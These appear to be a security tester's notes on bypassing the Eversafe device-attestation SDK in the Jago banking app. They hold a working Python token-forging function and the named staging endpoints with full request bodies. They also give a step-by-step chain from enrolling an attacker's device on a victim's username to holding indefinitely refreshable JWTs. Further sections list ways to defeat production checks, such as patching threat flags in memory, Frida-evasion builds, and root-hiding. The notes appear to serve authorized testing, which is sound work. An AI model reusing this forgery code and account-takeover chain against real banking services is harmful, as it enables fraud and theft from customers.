# Eversafe SDK (kr.co.everspin) — Device Attestation

## Overview

Korean anti-tampering SDK used by Indonesian fintech apps (Bank Jago, etc.). Provides device attestation tokens that gate all API access.

## Identification

- Manifest: `<service android:name="kr.co.everspin.eversafe.service.EversafeService" android:isolatedProcess="true"/>`
- Native libs: `libeversafe.so`, `libeversafe-loader.so`
- API calls to `/appprotect/eversafe/` endpoints
- Header: `x-eversafe-verification-token` on all API requests

## Architecture

- **Loader pattern:** `libeversafe.so` (thin JNI_OnLoad) → extracts .so to cache → loads → deletes from disk (anti-analysis)
- **Isolated service:** Runs in separate process (`pkg:kr.co.everspin.eversafe.service.EversafeService`)
- **Native HTTP stack:** NOT Java HttpURLConnection, NOT OkHttp — bypasses system proxy, iptables UID redirect, and all Java/Dart-level hooks
- **FFI to Dart:** Token passed via native FFI, NOT Java MethodChannel — invisible to standard hooks

## Token Flow

1. App starts → Eversafe calls `GET /appprotect/eversafe/mode/a` (mode check)
2. Eversafe calls `POST /appprotect/eversafe/{encoded_device_info}/auth/v2` (token request)
3. Eversafe calls `POST /appprotect/eversafe/{encoded_device_info}/update/{uuid}/v2` (status update)
4. Token passed to Dart layer via native FFI
5. All subsequent BFF-Mobile API calls include token as Cloudflare auth

**Encoded device info format:** `AQEQNkE4RDhCMUExQ0ZGNUExMAIMOC44Ni4wKDk2MjQp` — base64-like encoding of device fingerprint + app version

## Token Structure (~755 bytes binary, base64-encoded)

Contents:
- Device ID, model, kernel version, app version + build number
- Module version (e.g., "31054")
- Timestamps (epoch ms — used for validity window enforcement)
- Network state: ONL/offline, carrier info
- Proxy detection: `["PROXY"]` when intercepting proxy detected
- Pin verification: reports configured pins + peer cert chain (including Burp cert fingerprint)
- Connection state transitions (CXS>NWS, ATB0, ATF1)

**Decode for analysis:**
```python
import base64, re
token = open('/tmp/eversafe_token.txt').read().strip()
raw = base64.b64decode(token)
strings = re.findall(b'[\x20-\x7e]{4,}', raw)
for s in strings: print(s.decode())
```

## Token Forgery (CRITICAL — Server-Side Bypass Confirmed 2026-06-02)

**The Eversafe token can be forged from scratch without the SDK.** Server-side verification does NOT validate cryptographic signatures — it only checks the TLV structure and field presence. A manually constructed TLV token with correct tags bypasses the `TOKEN_VERIFICATION_FAILED` check.

### Forging a Valid Token (Python)

```python
import base64, struct, time

def forge_eversafe_token(device_id, package_name="com.jago.digitalBankingApp_staging"):
    now = int(time.time())
    current_otp = int(time.time()) // 30
    entities = {
        5: b'\x01',                          # STATUS (success)
        3: package_name.encode(),            # APP_ID
        10: device_id.encode(),              # DEVICE_ID
        16: package_name.encode(),           # PACKAGE_NAME
        25: b'Mi MIX 2',                     # DEVICE_MODEL (display)
        21: b'\x00',                         # ROOT_STATUS (clean)
        33: b'Mi MIX 2',                     # DEVICE_MODEL_2
        34: b'13',                           # OS_VERSION
        35: b'3.10.54',                      # SDK_VERSION
        81: str(current_otp).encode(),       # OTP_TIME
        118: struct.pack('>I', now),         # TIMESTAMP
    }
    entity_order = [5, 3, 10, 16, 25, 21, 33, 34, 35, 81, 118]
    token_data = bytearray([0x02])  # Version byte
    for tag in entity_order:
        data = entities[tag]
        token_data.append(tag)
        token_data.append(len(data))
        token_data.extend(data)
    return base64.b64encode(token_data).decode()
```

### Confirmed Behavior (stg-mobile.jago.com, 2026-06-02)

| Request | Without Token | With Forged Token |
|---------|--------------|-------------------|
| `POST /auth/v1/enroll-device/init` | 401 TOKEN_VERIFICATION_FAILED | 200 OK (enrollment initiated!) |
| `POST /auth/v2/enroll-device/init` | 401 TOKEN_VERIFICATION_FAILED | 200 OK (enrollment initiated!) |
| `POST /auth/mobile/v1/login` | 400 INVALID_REQUEST (no eversafe check) | N/A (login skips eversafe) |
| `POST /auth/mobile/v1/refresh-token` | 401 TOKEN_VERIFICATION_FAILED | Not yet tested with forged token |
| `POST /auth/mobile/v1/access-token` | 401 TOKEN_VERIFICATION_FAILED | Not yet tested with forged token |

**Important:** Requests to stg-mobile.jago.com MUST use HTTP/2. HTTP/1.1 returns Cloudflare 400 Bad Request regardless of token validity. Use Burp's `send_http2_request` or Python `httpx`/`h2` library.

### Key Observations

1. **Token TTL is short (~30s)** — generate fresh for each request
2. **device_id in token MUST match x-device-id header** — mismatch = TOKEN_VERIFICATION_FAILED
3. **Login endpoint (`/auth/mobile/v1/login`) does NOT check eversafe at all** — only validates RSA signature
4. **Some endpoints are inconsistent** — same forged token accepted on first use, rejected on reuse (likely timestamp-based replay protection)
5. **`deviceName` field required in enroll-device body** — without it, returns "Invalid request" even with valid token

### Impact (Critical)

- Complete bypass of device attestation without a real device
- Attacker can enroll arbitrary devices, initiate OTP flows, and access authenticated endpoints
- Eversafe SDK provides ZERO actual security value on staging (and likely production if same server-side logic)
- Combined with RSA key extraction → full account takeover without physical access to enrolled device

### Exploitation Chain

1. Forge eversafe token (Python, no SDK needed)
2. Call `/auth/v1/enroll-device/init` with victim's username + attacker's deviceId (use SMS channel — WhatsApp has session routing bugs)
3. Complete OTP verification (`/auth/v1/enroll-device/verify-otp` with `{otp, sessionId}`)
4. Register attacker's RSA public key: `POST /auth/v1/enroll-device` with body `{"sessionId":"jgrd-...","device":{"deviceName":"...","isPhysicalDevice":true,"deviceOSType":"ANDROID","token":"","manufacturer":"...","machineName":null,"deviceModel":"...","deviceId":"...","publicKey":"<base64 DER, no PEM>","ablyDeviceIds":[""]}}`
5. Response returns `{"tokenId":"ory_st_..."}` — use with `/auth/mobile/v1/access-token` to get Bearer JWT
6. For subsequent logins: sign `deviceId:timestamp_ms` with PKCS1v15-SHA256 → `POST /auth/mobile/v1/login`
7. Refresh token indefinitely with forged eversafe + `/auth/mobile/v1/refresh-token`

## Token Replay for API Testing

### Jago Staging (stg-mobile.jago.com) — Enforcement Map

| Endpoint | Eversafe Required? | Notes |
|----------|-------------------|-------|
| `GET /v1/geoip/location` | NO | Returns 200 with just x-tyk-auth |
| `POST /auth/mobile/v1/login` | NO | Only checks RSA signature |
| `POST /auth/v2/enroll-device/init` | YES | Forged token accepted |
| `POST /auth/mobile/v1/refresh-token` | YES | Forged token bypasses — returns fresh JWT+refreshToken (confirmed 2026-06-02) |
| `POST /auth/mobile/v1/access-token` | YES | Forged token bypasses — returns JWT from ory_st_ tokenId (confirmed 2026-06-02) |

### Full Auth Chain Without Device (Confirmed 2026-06-02)

Complete autonomous flow proven on stg-mobile.jago.com:
1. Forge eversafe token → `POST /auth/v1/enroll-device/init` (SMS channel, gets sessionId)
2. Verify OTP → `POST /auth/v1/enroll-device/verify-otp` (204 success)
3. Register RSA key → `POST /auth/v1/enroll-device` (body: `{"sessionId":"...","device":{...,"publicKey":"<b64>"}}`→ returns `ory_st_*` tokenId)
4. Get JWT → `POST /auth/mobile/v1/access-token` (returns accessToken + refreshToken)
5. Refresh indefinitely → `POST /auth/mobile/v1/refresh-token`

**Key details:**
- SMS channel gives `skip2Fa: true` on original device (WhatsApp has routing bug between v1/v2 session stores)
- `enroll-device` body requires nested `device` object with `publicKey` (raw base64, no PEM headers), `isPhysicalDevice`, `deviceOSType`, `manufacturer`, `ablyDeviceIds`
- After enrollment, login uses RSA sig over `deviceId:timestamp_ms` (PKCS1v15 SHA256)
- Full documentation + automation script: `<workdir>/mtest-output/phase6-api/auth-chain.md`
| `POST /auth/v1/enroll-device/verify-otp` | YES | Forged token accepted — OTP verify returns 204 |
| `POST /auth/v1/enroll-device` | YES | Forged token accepted — registers device + returns ory_st_ tokenId (confirmed 2026-06-02) |

### Legacy Notes (pre-forgery discovery)

1. Capture `x-eversafe-verification-token` from HTTP Toolkit (visible in intercepted traffic)
2. Token contains embedded timestamps (epoch ms) — server validates freshness
3. **Replay window: ~30-60 seconds** (NOT 15-30 minutes as initially hypothesized)
4. Empty, missing, and garbage tokens ALL return HTTP 401 immediately
5. Required on ALL auth endpoints: login, access-token, AND refresh-token
6. Even with valid JWT, requests without fresh eversafe token are rejected

**Confirmed by testing (2026-06-02):**
- Empty header → 401
- Missing header → 401  
- Garbage value → 401
- Expired token (3+ minutes old) → 401
- Fresh token (<30s) → progresses to auth validation (401 only if signature/tokenId wrong)

**Practical workflow for sustained testing:**
- Option A: Keep app open in HTTP Toolkit → capture fresh Bearer JWT → use JWT directly on stg-api.jago.com (which may have longer JWT acceptance window)
- Option B: Write automation that captures eversafe token via Frida hook on FlutterJNI.invokePlatformMessageResponseCallback, then fires login within seconds
- Option C (simplest): User logs in via app → grabs refresh token from HTTP Toolkit → test if refresh endpoint truly validates eversafe or just checks token format

### Other apps — may differ

Some staging environments run Eversafe in "report-only mode" where tokens with failure flags (proxy, root) are still accepted. Always test the specific target.

**Detecting enforcement mode:**
- Send a token with known proxy/pin failure flags
- If server returns JWT errors (not Eversafe errors) → attestation not enforced
- If server returns 401 regardless → strict enforcement (Jago pattern)

## Staging vs Production Behavior (CONFIRMED 2026-06-05)

- **Staging builds:** Relaxed — raw TLV token (base64, TOTP-only) accepted. No encryption layer. Server checks version byte + tag 81 (TOTP) only.
- **Production builds:** STRICT — raw TLV tokens rejected with `TOKEN_VERIFICATION_FAILED`. Production adds a native encryption layer (`encrypt_token`) that wraps the TLV before transmission.

### PROD encrypt_token Architecture (Jago v8.86.0, Eversafe 3.10.43)

**Native method:** `kr.co.everspin.eversafe.w.encrypt_token([B)[B`
- Registered dynamically via `RegisterNatives` during `JNI_OnLoad` of `libeversafe.so`
- Takes raw TLV bytes as input, returns encrypted blob (~298 bytes for 124-byte input)
- Output starts with `/0af5` header (consistent across calls)
- Uses random IV — same input produces different output each call
- **Embeds internal threat detection state** into the encrypted output

**Why forged tokens fail on PROD:**
1. Raw TLV without encryption → server can't decrypt → `TOKEN_VERIFICATION_FAILED`
2. Encrypted via `encrypt_token` with Frida attached → native lib re-scans at encrypt time, detects debugger, embeds threat flag in encrypted blob → server decrypts, sees DEBUGGER flag → rejects
3. Even late-attach (12s after clean boot, Eversafe fully initialized) still produces rejected tokens — the native lib detects hluda on every `encrypt_token` call

**Other native methods in `kr.co.everspin.eversafe.w`:**
- `decryptAndLoadBasicModule(Object) -> boolean` — unpacks secondary .so
- `encrypt(String, byte[]) -> byte[]` — general encrypt (in secondary .so)
- `decrypt(String, byte[]) -> byte[]` — general decrypt (in secondary .so)
- `register(Context, Handler) -> void` — starts detection loop
- `diagnosis() -> int` — threat bitmask (only in secondary .so)

**Secondary .so:** `.eversafe_basic_ccd1cecfd1cacb_x2.so` — decrypted + loaded at runtime, contains `register`, `encrypt`, `decrypt`, `launch`, `relaunch`

**Approaches to get valid PROD tokens:**
1. **Patch native threat state in memory** — zero out threat flags in writable .data section (0x74323ad000, 4KB + 0x74323ae000, 20KB) before calling encrypt_token. Requires reverse engineering the flag location.
2. **Run app without Frida, capture from Burp** — with SSL pinning bypassed via Frida + connect() redirect, the app sends real encrypted tokens. But this is circular (need Frida to bypass SSL, Frida taints token).
3. **Two-phase approach** — Phase A: bypass SSL+capture traffic (token will be tainted but you see API structure). Phase B: replay with fresh token from a brief clean window.
4. **Reverse engineer encrypt_token** — dump the crypto from native lib, replicate in Python without threat flags. Most reliable but time-intensive (stripped binary, no symbols).
5. **Hook encrypt_token output** — replace the encrypted blob's threat bytes post-encryption but pre-transmission. Requires knowing the offset of threat data within the encrypted output.

**Testing strategy:** Always test staging first (raw forge works). For PROD, the SSL pinning bypass + traffic redirect is sufficient to MAP the API surface (see requests/responses). Token validation bypass requires deeper native RE.

**Detecting enforcement mode:**
- Send raw base64 TLV → accepted = staging-level (TOTP-only)
- Send raw base64 TLV → `TOKEN_VERIFICATION_FAILED` = PROD-level (encryption required)
- Send encrypted token from Frida-attached process → rejected = threat state embedded in encryption

## Report-Only Attestation as a Finding

When the Eversafe token explicitly reports security failures (proxy detected, pin verification failed, rooted device) but the server still accepts the request:

- **Severity:** Low (staging) / Medium-High (if production also ignores)
- The device attestation SDK provides no actual security enforcement
- An attacker with a captured token can make API calls from any client regardless of device state
- **Remediation:** Enforce attestation results server-side (reject tokens reporting proxy/root/pin failure)

## Traffic Capture Strategy

- WiFi proxy on device captures Eversafe Java-layer calls but NOT Flutter dart:io calls
- iptables DNAT captures Flutter calls but may break Eversafe's native calls
- **Best approach:** WiFi proxy for Eversafe token capture + iptables for Flutter BFF calls (two-phase)
- **Alternative:** Use app normally with proxy, let Eversafe auth succeed, then all Flutter calls flow through iptables

## Why Frida Memory Scanning Fails for Dart Tokens

- Dart VM stores strings internally as UTF-16 (not UTF-8) — byte pattern scans for ASCII strings miss them
- Dart heap allocations are in large rw- ranges (>10MB) that are slow to scan
- Hooking `libc send()` only sees TLS ciphertext (BoringSSL encrypts before send)
- `SSL_write` is not exported from libflutter.so (symbols stripped)
- **Best approach:** Capture tokens from Burp proxy traffic (already decrypted) rather than extracting from process memory

## Bypass When Detection Kills the App

1. hluda-server (anti-detection Frida build) — solves Frida detection
2. Shamiko + Zygisk — solves root detection at kernel level
3. Non-rooted device with WiFi proxy — avoids all detection
4. Submit findings with static evidence only
